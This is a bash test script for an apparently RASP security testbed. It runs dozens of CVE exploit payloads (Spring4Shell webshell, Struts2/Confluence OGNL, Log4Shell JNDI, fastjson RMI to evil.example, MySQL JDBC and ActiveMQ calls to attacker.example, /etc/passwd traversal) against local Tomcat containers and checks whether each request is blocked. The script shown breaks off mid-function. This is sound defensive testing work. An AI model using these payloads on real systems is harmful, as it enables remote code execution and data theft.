#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

versions=(9 10 11)
declare -A baseline_ports=(
  [9]="${OHMYRASP_TOMCAT9_BASELINE_PORT:-18080}"
  [10]="${OHMYRASP_TOMCAT10_BASELINE_PORT:-18082}"
  [11]="${OHMYRASP_TOMCAT11_BASELINE_PORT:-18084}"
)
declare -A protected_ports=(
  [9]="${OHMYRASP_TOMCAT9_PROTECTED_PORT:-18081}"
  [10]="${OHMYRASP_TOMCAT10_PROTECTED_PORT:-18083}"
  [11]="${OHMYRASP_TOMCAT11_PROTECTED_PORT:-18085}"
)

rm -rf logs/tomcat*-baseline logs/tomcat*-protected
for version in "${versions[@]}"; do
  mkdir -p "logs/tomcat${version}-baseline" "logs/tomcat${version}-protected"
done

docker compose build --pull
docker compose up -d

cleanup() {
  for version in "${versions[@]}"; do
    docker compose logs --no-color "tomcat${version}-baseline" > "logs/tomcat${version}-baseline/tomcat.log" || true
    docker compose logs --no-color "tomcat${version}-protected" > "logs/tomcat${version}-protected/tomcat.log" || true
  done
}
trap cleanup EXIT

wait_for() {
  local name="$1"
  local url="$2"
  for _ in $(seq 1 120); do
    if curl -fsS "${url}/rasp/health" >/dev/null 2>&1; then
      return
    fi
    sleep 1
  done
  echo "${name} did not become healthy at ${url}" >&2
  exit 1
}

slug() {
  printf "%s" "$1" | tr -c "[:alnum:]_.-" "_"
}

final_url() {
  local outfile="$1"
  shift
  curl -sS -L -o "$outfile" -w "%{url_effective}" "$@" 2>"${outfile}.err" || true
}

expect_body_contains() {
  local url="$1"
  local needle="$2"
  local body
  body="$(curl -fsS "$url")"
  if [[ "$body" != *"$needle"* ]]; then
    echo "expected ${url} to contain ${needle}" >&2
    exit 1
  fi
}

missing_redirect=0

expect_block() {
  local version="$1"
  local name="$2"
  shift 2
  local outfile="logs/tomcat${version}-protected/$(slug "$name").response"
  local final
  final="$(final_url "$outfile" "$@")"
  if [[ "$final" == *"/rasp/blocked"* ]]; then
    echo "blocked tomcat${version} ${name}"
  else
    echo "missing protected redirect for tomcat${version} ${name}; final URL was ${final}" >&2
    missing_redirect=1
  fi
}

expect_block_redirect() {
  local version="$1"
  local name="$2"
  shift 2
  local outfile="logs/tomcat${version}-protected/$(slug "$name").response"
  local headers="${outfile}.headers"
  local status
  status="$(curl -sS -o "$outfile" -D "$headers" -w "%{http_code}" "$@" 2>"${outfile}.err" || true)"
  local location
  location="$(awk 'BEGIN{IGNORECASE=1} /^Location:/ {print $2}' "$headers" | tr -d '\r' | tail -n 1)"
  if [[ "$status" =~ ^30[12378]$ && "$location" == *"/rasp/blocked"* ]]; then
    echo "blocked tomcat${version} ${name}"
  else
    echo "missing protected redirect for tomcat${version} ${name}; status was ${status}, location was ${location}" >&2
    missing_redirect=1
  fi
}

expect_not_blocked() {
  local version="$1"
  local name="$2"
  shift 2
  local outfile="logs/tomcat${version}-baseline/$(slug "$name").response"
  local final
  final="$(final_url "$outfile" "$@")"
  if [[ "$final" == *"/rasp/blocked"* ]]; then
    echo "baseline tomcat${version} unexpectedly redirected for ${name}; final URL was ${final}" >&2
    missing_redirect=1
  else
    echo "baseline tomcat${version} ${name}"
  fi
}

run_version() {
  local version="$1"
  local baseline_url="http://localhost:${baseline_ports[$version]}"
  local protected_url="http://localhost:${protected_ports[$version]}"
  local mysql_jdbc_url="jdbc:mysql://attacker.example:3308/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"
  local linkis_mysql_datasource_body
  linkis_mysql_datasource_body="$(cat <<'JSON'
{
  "dataSourceName": "evil",
  "dataSourceTypeId": 1,
  "createSystem": "Linkis",
  "connectParams": {
    "host": "attacker.example",
    "port": "3308",
    "username": "dd14fff",
    "password": "x",
    "params": "{\"autoDeserialize\":\"true\",\"statementInterceptors\":\"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"useSSL\":\"false\",\"maxAllowedPacket\":\"16777216\"}"
  }
}
JSON
)"
  local generated_script_payload="[0:system('touch /tmp/success')]"
  local generated_script_key_payload=';system "touch /tmp/poc" "'
  local h2_console_alias_sql='CREATE ALIAS OHMYRASP_CONSOLE_SHELL AS $$ String shell(String cmd) throws java.io.IOException { java.lang.Runtime.getRuntime().exec(cmd); return cmd; } $$'
  local h2_console_login_jdbc_url='jdbc:h2:mem:ohmyrasp_h2_console_login;INIT=CREATE ALIAS OHMYRASP_LOGIN_SHELL AS $$ String shell(String cmd) throws java.io.IOException { java.lang.Runtime.getRuntime().exec(cmd)\; return cmd\; } $$'
  local h2_console_jndi_url='ldap://127.0.0.1:9/Exploit'
  local log4shell_jndi_payload='${jndi:ldap://${sys:java.version}.example.com}'
  local shiro_default_rememberme_cookie='rememberMe=AAECAwQFBgcICQoLDA0OD99XrYvceC/RUMm6dUki3C8='
  local spring_cve_2016_4977_response_type='${T(java.lang.Runtime).getRuntime().exec("touch /tmp/success")}'
  local spring_cve_2017_4971_field='%5F%28new%20java.lang.ProcessBuilder%28%22bash%22%2C%22-c%22%2C%22id%22%29%29.start%28%29'
  local spring_cve_2017_8046_body
  spring_cve_2017_8046_body="$(cat <<'JSON'
[{"op":"replace","path":"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))/lastname","value":"vulhub"}]
JSON
)"
  local spring_cve_2018_1273_field='username%5B%23this.getClass().forName(%22java.lang.Runtime%22).getRuntime().exec(%22touch%20%2Ftmp%2Fsuccess%22)%5D'
  local spring_cve_2022_22963_expression='T(java.lang.Runtime).getRuntime().exec("touch /tmp/success")'
  local spring_cve_2022_22965_query
  spring_cve_2022_22965_query="$(cat <<'EOF'
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))%21%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
EOF
)"
  local spring_cve_2022_22947_body
  spring_cve_2022_22947_body="$(cat <<'JSON'
{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}
JSON
)"
  local nacos_derby_code_sql
  nacos_derby_code_sql="$(cat <<'SQL'
CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE('values cast(X''504b0304'' as blob)', '/tmp/payload', ',', '"', 'UTF-8', '/tmp/payload.jar')
CALL sqlj.install_jar('/tmp/payload.jar', 'NACOS.PAYLOAD', 0)
CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'NACOS.PAYLOAD')
CREATE FUNCTION S_EXAMPLE(PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'Exec.exec'
SQL
)"
  local kkfileview_preview_url='aHR0cDovL2F0dGFja2VyLmV4YW1wbGUvdGVzdC56aXA='
  local java_serialized_body='aced0005737200'
  local jaas_provider_url="ldap://java-chains:50389/x"
  local kafka_druid_sampler_body
  kafka_druid_sampler_body="$(cat <<'JSON'
{
  "type": "kafka",
  "spec": {
    "type": "kafka",
    "ioConfig": {
      "type": "kafka",
      "consumerProperties": {
        "bootstrap.servers": "127.0.0.1:6666",
        "sasl.mechanism": "SCRAM-SHA-256",
        "security.protocol": "SASL_SSL",
        "sasl.jaas.config": "com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://java-chains:50389/x\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";"
      },
      "topic": "test",
      "useEarliestOffset": true
    }
  }
}
JSON
)"
  local fastjson_1224_body
  fastjson_1224_body="$(cat <<'JSON'
{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://evil.example:9999/TouchFile","autoCommit":true}}
JSON
)"
  local fastjson_1247_body
  fastjson_1247_body="$(cat <<'JSON'
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://evil.example:9999/Exploit","autoCommit":true}}
JSON
)"
  local jackson_templates_body
  jackson_templates_body="$(cat <<'JSON'
{"param":["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",{"transletBytecodes":["AA=="],"transletName":"a.b","outputProperties":{}}]}
JSON
)"
  local jackson_spring_xml_body
  jackson_spring_xml_body="$(cat <<'JSON'
{"param":["org.springframework.context.support.FileSystemXmlApplicationContext","http://evil.example/spel.xml"]}
JSON
)"
  local jmreport_freemarker_body
  jmreport_freemarker_body="$(cat <<'JSON'
{"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}'"}
JSON
)"
  local struts2_s2045_content_type="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data"
  local struts2_s2046_boundary="----WebKitFormBoundaryXd004BVJN9pBYBL2"
  local struts2_s2046_filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',233*233)}%00b"
  local struts2_s2046_body_file="logs/tomcat${version}-baseline/struts2-s2046.multipart"
  local struts2_ognl_runtime_payload="%{(#_memberAccess['allowStaticMethodAccess']=true,@java.lang.Runtime@getRuntime().exec('id'))}"
  local struts2_dollar_ognl_runtime_payload='${#_memberAccess["allowStaticMethodAccess"]=true,@java.lang.Runtime@getRuntime().exec("id")}'
  local struts2_s2005_eval_query="%28%27%23rt.exec%28%22id%22%29%27%29%28%23rt%3D%40java.lang.Runtime%40getRuntime%28%29%29=1"
  local struts2_s2016_redirect_query="redirect:%24%7B%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%7D=1"
  local struts2_s2032_method_query="method:%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.cmd%5B0%5D%29=1&cmd=id"
  local struts2_s2057_namespace_path="/struts2-showcase/%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29%7D/actionChain1.action"
  local struts2_s2061_boundary="----WebKitFormBoundaryl7d1B1aGsV2wcZwF"
  local struts2_s2061_payload='%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("id")).(#execute.exec(#arglist))}'
  local struts2_s2061_body_file="logs/tomcat${version}-baseline/struts2-s2061.multipart"
  local confluence_cve_2021_26084_query_string
  confluence_cve_2021_26084_query_string="$(cat <<'EOF'
\u0027+{Class.forName(\u0027javax.script.ScriptEngineManager\u0027).newInstance().getEngineByName(\u0027JavaScript\u0027).\u0065val(\u0027var p = new java.lang.ProcessBuilder(\u0022bash\u0022,\u0022-c\u0022,\u0022id\u0022);p.start()\u0027)}+\u0027
EOF
)"
  local confluence_cve_2022_26134_path="/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
  local nexus_cve_2024_4956_path="/%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
  local weblogic_uddi_operator_url="http://172.19.0.2:6379/test%0D%0A%0D%0Aconfig%20set%20dir%20/etc/%0D%0Asave"
  local geoserver_jiffle_wps_body
  geoserver_jiffle_wps_body="$(cat <<'XML'
<wps:Execute service="WPS" version="1.0.0"
    xmlns:wps="http://www.opengis.net/wps/1.0.0"
    xmlns:ows="http://www.opengis.net/ows/1.1">
  <wps:DataInputs>
    <wps:Input>
      <ows:Identifier>script</ows:Identifier>
      <wps:Data>
        <wps:LiteralData>dest = y() - 500; // */ public class Double { static { java.lang.Runtime.getRuntime().exec("id"); } } /**</wps:LiteralData>
      </wps:Data>
    </wps:Input>
  </wps:DataInputs>
</wps:Execute>
XML
)"
  local weblogic_workcontext_body
  weblogic_workcontext_body="$(cat <<'XML'
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.4.0" class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>sh</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>id</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
XML
)"
  local activemq_jolokia_body
  activemq_jolokia_body="$(cat <<'JSON'
{"type":"exec","mbean":"org.apache.activemq:type=Broker,brokerName=localhost","operation":"addNetworkConnector(java.lang.String)","arguments":["static:(vm://evil?brokerConfig=xbean:http://attacker.example/poc.xml)"]}
JSON
)"
  local activemq_jolokia_file_write_body
  activemq_jolokia_file_write_body="$(cat <<'JSON'
{"type":"exec","mbean":"org.apache.logging.log4j2:type=LoggerContext,ctx=default","operation":"setConfigText","arguments":["<Configuration><Appenders><RollingRandomAccessFile name='RollingFile' fileName='/opt/activemq/webapps/admin/shell.jsp'/></Appenders></Configuration>","utf-8"]}
JSON
)"
  local activemq_fileserver_destination="file:///opt/activemq/webapps/api/s.jsp"
  local cxf_xop_body
  cxf_xop_body="$(cat <<'SOAP'
------kkkkkk123123213
Content-Disposition: form-data; name="1"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://service.namespace/">
   <soapenv:Header/>
   <soapenv:Body>
      <web:test>
         <arg0>
<count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/hosts"></xop:Include></count>
</arg0>
      </web:test>
   </soapenv:Body>
</soapenv:Envelope>
------kkkkkk123123213--
SOAP
)"
  local coldfusion_amf_body_b64="QU1GAAOs7QAFc3IAJWlvLm9obXlyYXNwLnBsYXlncm91bmQuRXZpbFNlcmlhbGl6ZWQAAAAAAAAAAQIAAUwABm1hcmtlcnQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdAADcG9j"
  local coldfusion_amf_body_file="logs/tomcat${version}-baseline/coldfusion-amf-poc.bin"
  local coldfusion_metadata_payload='{"_metadata":{"classname":"../../../../../../../../proc/self/environ"}}'
  local coldfusion_locale_query="../../../../../../../../../../etc/passwd%00en"
  local liferay_jsonws_body='cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&p_auth=o3lt8q1F&formDate=1585270368703&tableId=1&name=2&type=3&%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource=%7B%22userOverridesAsString%22%3A%22HexAsciiSerializedMap%3Aaced00057372003d636f6d2e6d6368%22%7D'
  local cas_webflow_body='username=test&password=test&lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&execution=CAS4_ENCRYPTED_COMMONS_COLLECTIONS4_CLIENT_STATE&_eventId=submit&submit=LOGIN'
  printf "%s" "$coldfusion_amf_body_b64" | base64 -d > "$coldfusion_amf_body_file"
  {
    printf -- "--%s\r\n" "$struts2_s2046_boundary"
    printf 'Content-Disposition: form-data; name="upload"; filename="%s"\r\n' "$struts2_s2046_filename"
    printf 'Content-Type: text/plain\r\n\r\n'
    printf 'foo\r\n'
    printf -- "--%s--\r\n" "$struts2_s2046_boundary"
  } > "$struts2_s2046_body_file"
  {
    printf -- "--%s\r\n" "$struts2_s2061_boundary"
    printf 'Content-Disposition: form-data; name="id"\r\n\r\n'
    printf '%s\r\n' "$struts2_s2061_payload"
    printf -- "--%s--\r\n" "$struts2_s2061_boundary"
  } > "$struts2_s2061_body_file"

  wait_for "tomcat${version}-baseline" "$baseline_url"
  wait_for "tomcat${version}-protected" "$protected_url"

  expect_body_contains "${baseline_url}/" "OhMyRasp"
  expect_body_contains "${protected_url}/" "OhMyRasp"
  expect_body_contains "${baseline_url}/rasp/ui" "OhMyRasp Comparative Testbed"
  expect_body_contains "${protected_url}/rasp/ui" "OhMyRasp Comparative Testbed"
  expect_body_contains "${protected_url}/rasp/cases" "Command user input"
  expect_body_contains "${protected_url}/rasp/environments" "tomcat${version}-protected"
  expect_body_contains "${protected_url}/rasp/labs" "expression-injection"
  expect_body_contains "${protected_url}/rasp/blocked?algorithm=test&hook=test&message=test" "Request intercepted"

  expect_not_blocked "$version" baseline_command -G --data-urlencode "cmd=sh" --data-urlencode "arg=-c" --data-urlencode "arg=cat /etc/passwd; id" "${baseline_url}/rasp/command"
  expect_not_blocked "$version" baseline_command_config_listener "${baseline_url}/rasp/policy/command-config-listener"
  expect_not_blocked "$version" baseline_solr_cve_2017_12629_runexecutable_command "${baseline_url}/rasp/policy/command-solr-cve-2017-12629-runexecutable"
  expect_not_blocked "$version" baseline_command_config_injection "${baseline_url}/rasp/policy/command-config-injection"
  expect_not_blocked "$version" baseline_rocketmq_cve_2023_33246_filterserver_command "${baseline_url}/rasp/policy/command-rocketmq-cve-2023-33246-filterserver"
  expect_not_blocked "$version" baseline_file_read -G --data-urlencode "path=/etc/passwd" "${baseline_url}/rasp/file/read"
  expect_not_blocked "$version" baseline_write_config_path "${baseline_url}/rasp/policy/write-config-path"
  expect_not_blocked "$version" baseline_rocketmq_cve_2023_37582_namesrv_config_path "${baseline_url}/rasp/policy/write-rocketmq-cve-2023-37582-config-path"
  expect_not_blocked "$version" baseline_write_generated_script -G --data-urlencode "payload=${generated_script_payload}" "${baseline_url}/rasp/policy/write-generated-script"
  expect_not_blocked "$version" baseline_opentsdb_cve_2020_35476_generated_yrange_script -G --data-urlencode "payload=${generated_script_payload}" "${baseline_url}/rasp/policy/write-generated-script"
  expect_not_blocked "$version" baseline_opentsdb_cve_2023_25826_generated_key_script -G --data-urlencode "payload=${generated_script_key_payload}" "${baseline_url}/rasp/policy/write-generated-script-key"
  expect_not_blocked "$version" baseline_upload_policy "${baseline_url}/rasp/policy/upload-script"
  expect_not_blocked "$version" baseline_upload_expression_filename "${baseline_url}/rasp/policy/upload-expression-filename"
  expect_not_blocked "$version" baseline_struts2_s2046_filename -X POST -H "Content-Type: multipart/form-data; boundary=${struts2_s2046_boundary}" --data-binary "@${struts2_s2046_body_file}" "${baseline_url}/index.action"
  expect_not_blocked "$version" baseline_upload_traversal "${baseline_url}/rasp/policy/upload-traversal"
  expect_not_blocked "$version" baseline_upload_java_archive "${baseline_url}/rasp/policy/plugin-upload"
  expect_not_blocked "$version" baseline_weblogic_ws_utc_jsp_upload -X POST -H "Content-Type: multipart/form-data; boundary=ohmyrasp" "${baseline_url}/ws_utc/resources/setting/keystore?filename=shell.jsp"
  expect_not_blocked "$version" baseline_activemq_fileserver_put -X PUT --data-binary "<% out.println(1); %>" "${baseline_url}/fileserver/2.txt"
  expect_not_blocked "$version" baseline_activemq_fileserver_move -X MOVE -H "Destination: ${activemq_fileserver_destination}" "${baseline_url}/fileserver/2.txt"
  expect_not_blocked "$version" baseline_webdav_unsafe_destination "${baseline_url}/rasp/policy/webdav-unsafe-destination"
  expect_not_blocked "$version" baseline_archive -G --data-urlencode "entry=../escaped/archive.txt" "${baseline_url}/rasp/archive"
  expect_not_blocked "$version" baseline_kkfileview_zipslip_preview -G --data-urlencode "url=${kkfileview_preview_url}" "${baseline_url}/onlinePreview"
  expect_not_blocked "$version" baseline_h2_sql "${baseline_url}/rasp/h2/sql"
  expect_not_blocked "$version" baseline_h2_console_query -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "sql=${h2_console_alias_sql}" "${baseline_url}/h2-console/query.do"
  expect_not_blocked "$version" baseline_h2_jdbc_init "${baseline_url}/rasp/h2/jdbc-init"
  expect_not_blocked "$version" baseline_derby_code_sql "${baseline_url}/rasp/policy/sql-derby-code"
  expect_not_blocked "$version" baseline_nacos_cve_2021_29442_derby_ops_code_sql -G --data-urlencode "sql=${nacos_derby_code_sql}" "${baseline_url}/nacos/v1/cs/ops/derby"
  expect_not_blocked "$version" baseline_mysql_jdbc -G --data-urlencode "url=${mysql_jdbc_url}" "${baseline_url}/rasp/jdbc/mysql"
  expect_not_blocked "$version" baseline_linkis_cve_2022_44645_mysql_datasource_connect -X POST -H "Content-Type: application/json;charset=UTF-8" --data-binary "$linkis_mysql_datasource_body" "${baseline_url}/api/rest_j/v1/data-source-manager/op/connect/json"
  expect_not_blocked "$version" baseline_path_confusion "${baseline_url}/rasp/policy/request-path-confusion"
  expect_not_blocked "$version" baseline_path_confusion_dot_segment -G --data-urlencode "uri=/./admin" "${baseline_url}/rasp/policy/request-path-confusion"
  expect_not_blocked "$version" baseline_shiro_cve_2010_3863_dot_segment_admin -G --data-urlencode "uri=/./admin" "${baseline_url}/rasp/policy/request-path-confusion"
  expect_not_blocked "$version" baseline_shiro_cve_2020_1957_semicolon_traversal_admin -G --data-urlencode "uri=/xxx/..;/admin/" "${baseline_url}/rasp/policy/request-path-confusion"
  expect_not_blocked "$version" baseline_nexus_cve_2024_4956_encoded_slash_traversal -G --data-urlencode "uri=${nexus_cve_2024_4956_path}" "${baseline_url}/rasp/policy/request-path-confusion"
  expect_not_blocked "$version" baseline_elasticsearch_cve_2015_3337_plugin_traversal -G --data-urlencode "uri=/_plugin/head/../../../../../../../../../etc/passwd" "${baseline_url}/rasp/policy/request-path-confusion"
  expect_not_blocked "$version" baseline_elasticsearch_cve_2015_5531_snapshot_traversal -G --data-urlencode "uri=/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd" "${baseline_url}/rasp/policy/request-path-confusion"
  expect_not_blocked "$version" baseline_path_confusion_elasticsearch_plugin -G --data-urlencode "uri=/_plugin/head/../../../../../../../../../etc/passwd" "${baseline_url}/rasp/policy/request-path-confusion"
  expect_not_blocked "$version" baseline_path_confusion_elasticsearch_snapshot -G --data-urlencode "uri=/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd" "${baseline_url}/rasp/policy/request-path-confusion"
  expect_not_blocked "$version" baseline_path_confusion_control_char -G --data-urlencode "uri=/admin/%0atest" "${baseline_url}/rasp/policy/request-path-confusion"
  expect_not_blocked "$version" baseline_spring_cve_2022_22978_regex_requestmatcher_lf -G --data-urlencode "uri=/admin/%0atest" "${baseline_url}/rasp/policy/request-path-confusion"
  expect_not_blocked "$version" baseline_spring_cve_2022_22978_regex_requestmatcher_cr -G --data-urlencode "uri=/admin/%0dtest" "${baseline_url}/rasp/policy/request-path-confusion"
  expect_not_blocked "$version" baseline_path_confusion_lenient -G --data-urlencode "uri=/setup/setup-s/%2>%2>/%2>%2>/user-create.jsp" "${baseline_url}/rasp/policy/request-path-confusion"
  expect_not_blocked "$version" baseline_openfire_cve_2023_32315_unicode_setup_traversal -G --data-urlencode "uri=/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp" "${baseline_url}/rasp/policy/request-path-confusion"
  expect_not_blocked "$version" baseline_path_confusion_overlong -G --data-urlencode "uri=/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd" "${baseline_url}/rasp/policy/request-path-confusion"
  expect_not_blocked "$version" baseline_path_confusion_ghostbits "${baseline_url}/rasp/policy/request-spring-jetty-ghostbits-path-confusion"
  expect_not_blocked "$version" baseline_flink_log_path_traversal "${baseline_url}/rasp/policy/request-flink-log-path-traversal"
  expect_not_blocked "$version" baseline_internal_resource "${baseline_url}/rasp/policy/request-internal-resource"
  expect_not_blocked "$version" baseline_jetty_cve_2021_28164_encoded_dot_webinf -G --data-urlencode "uri=/%2e/WEB-INF/web.xml" --data-urlencode "query=" "${baseline_url}/rasp/policy/request-internal-resource"
  expect_not_blocked "$version" baseline_jetty_cve_2021_28169_concat_double_decode -G --data-urlencode "query=/%2557EB-INF/web.xml" "${baseline_url}/rasp/policy/request-internal-resource"
  expect_not_blocked "$version" baseline_jetty_cve_2021_34429_unicode_dot_webinf -G --data-urlencode "uri=/%u002e/WEB-INF/web.xml" --data-urlencode "query=" "${baseline_url}/rasp/policy/request-internal-resource"
  expect_not_blocked "$version" baseline_jetty_cve_2021_34429_nul_dot_webinf -G --data-urlencode "uri=/.%00/WEB-INF/web.xml" --data-urlencode "query=" "${baseline_url}/rasp/policy/request-internal-resource"
  expect_not_blocked "$version" baseline_jetty_cve_2021_34429_nul_dotdot_webinf -G --data-urlencode "uri=/a/b/..%00/WEB-INF/web.xml" --data-urlencode "query=" "${baseline_url}/rasp/policy/request-internal-resource"
  expect_not_blocked "$version" baseline_forged_include_attribute "${baseline_url}/rasp/policy/request-forged-include-attribute"
  expect_not_blocked "$version" baseline_polytype -G --data-urlencode "parser=fastjson" --data-urlencode "type=com.sun.rowset.JdbcRowSetImpl" "${baseline_url}/rasp/deserialize/polymorphic"
  expect_not_blocked "$version" baseline_fastjson_1224_autotype -X POST -H "Content-Type: application/json" --data-binary "$fastjson_1224_body" "${baseline_url}/fastjson"
  expect_not_blocked "$version" baseline_fastjson_1247_autotype_bypass -X POST -H "Content-Type: application/json" --data-binary "$fastjson_1247_body" "${baseline_url}/fastjson"
  expect_not_blocked "$version" baseline_jackson_templates_polymorphic -X POST -H "Content-Type: application/json" --data-binary "$jackson_templates_body" "${baseline_url}/exploit"
  expect_not_blocked "$version" baseline_jackson_spring_xml_polymorphic -X POST -H "Content-Type: application/json" --data-binary "$jackson_spring_xml_body" "${baseline_url}/exploit"
  expect_not_blocked "$version" baseline_snakeyaml_h2_type -G --data-urlencode "parser=snakeyaml" --data-urlencode "type=org.h2.jdbc.JdbcConnection" "${baseline_url}/rasp/deserialize/polymorphic"
  expect_not_blocked "$version" baseline_deserialization_gadget "${baseline_url}/rasp/policy/deserialization-gadget"
  expect_not_blocked "$version" baseline_deserialization_cluster_message "${baseline_url}/rasp/policy/deserialization-cluster-message"
  expect_not_blocked "$version" baseline_tomcat_cve_2026_34486_tribes_encrypt_deserialization -G --data-urlencode "class=org.apache.commons.collections.functors.InvokerTransformer" "${baseline_url}/rasp/policy/deserialization-cluster-message"
  expect_not_blocked "$version" baseline_deserialization_logging_message "${baseline_url}/rasp/policy/deserialization-logging-message"
  expect_not_blocked "$version" baseline_deserialization_webflow_state "${baseline_url}/rasp/policy/deserialization-webflow-state"
  expect_not_blocked "$version" baseline_cas_webflow_execution_state -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "$cas_webflow_body" "${baseline_url}/cas/login"
  expect_not_blocked "$version" baseline_deserialization_rmi_transport "${baseline_url}/rasp/policy/deserialization-rmi-transport"
  expect_not_blocked "$version" baseline_neo4j_shell_rmi_deserialization -G --data-urlencode "gadget=org.mozilla.javascript.NativeJavaObject" "${baseline_url}/neo4j-shell/setSessionVariable"
  expect_not_blocked "$version" baseline_deserialization_remoting_transport "${baseline_url}/rasp/policy/deserialization-remoting-transport"
  expect_not_blocked "$version" baseline_deserialization_jms_object_message "${baseline_url}/rasp/policy/deserialization-jms-object-message"
  expect_not_blocked "$version" baseline_deserialization_signed_object "${baseline_url}/rasp/policy/deserialization-signed-object"
  expect_not_blocked "$version" baseline_deserialization_session_file -G --data-urlencode "id=.deserialize" "${baseline_url}/rasp/policy/deserialization-session-file"
  expect_not_blocked "$version" baseline_deserialization_protocol_class -G --data-urlencode "xml=http://attacker.example/poc.xml" "${baseline_url}/rasp/policy/deserialization-protocol-class"
  expect_not_blocked "$version" baseline_deserialization_http_invoker -H "Content-Type: application/x-java-serialized-object" "${baseline_url}/rasp/policy/deserialization-http-invoker"
  expect_not_blocked "$version" baseline_deserialization_http_object_stream "${baseline_url}/rasp/policy/deserialization-http-object-stream"
  expect_not_blocked "$version" baseline_jboss_readonly_deserialization -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary "$java_serialized_body" "${baseline_url}/invoker/readonly"
  expect_not_blocked "$version" baseline_jboss_jmxinvoker_deserialization -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary "$java_serialized_body" "${baseline_url}/invoker/JMXInvokerServlet"
  expect_not_blocked "$version" baseline_jbossmq_httpil_deserialization -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary "$java_serialized_body" "${baseline_url}/jbossmq-httpil/HTTPServerILServlet"
  expect_not_blocked "$version" baseline_deserialization_hessian_type "${baseline_url}/rasp/policy/deserialization-hessian-type"
  expect_not_blocked "$version" baseline_deserialization_xmlrpc_serialized -H "Content-Type: application/xml" "${baseline_url}/rasp/policy/deserialization-xmlrpc-serialized"
